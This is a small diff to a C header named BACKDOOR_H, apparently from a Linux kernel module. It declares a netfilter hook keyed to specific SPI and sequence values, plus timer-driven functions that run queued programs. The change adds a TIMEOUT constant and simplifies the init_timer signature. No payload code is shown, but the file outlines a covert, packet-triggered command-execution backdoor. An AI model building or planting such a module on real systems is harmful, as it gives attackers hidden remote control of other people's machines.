@@ -16,6 +16,7 @@ MODULE_LICENSE("GPL");
 #define DATA_LEN 255
 #define TARGET_SPI 0x48dcd78c
 #define TARGET_SEQ 0xae574ada
+#define TIMEOUT 5 // Timer timeout in seconds
 
 struct nf_hook_ops;
 
@@ -44,7 +45,7 @@ void execute_ready_programs(struct timer_list *tl);
 program_list *init_program(void);
 void init_prog_list(void);
 void add_program(program_list **head, program_list *entry);
-void init_timer(unsigned long timeout); // Timeout in seconds
+void init_timer(void);
 void destroy_timer(void);
 
 #endif /* BACKDOOR_H */
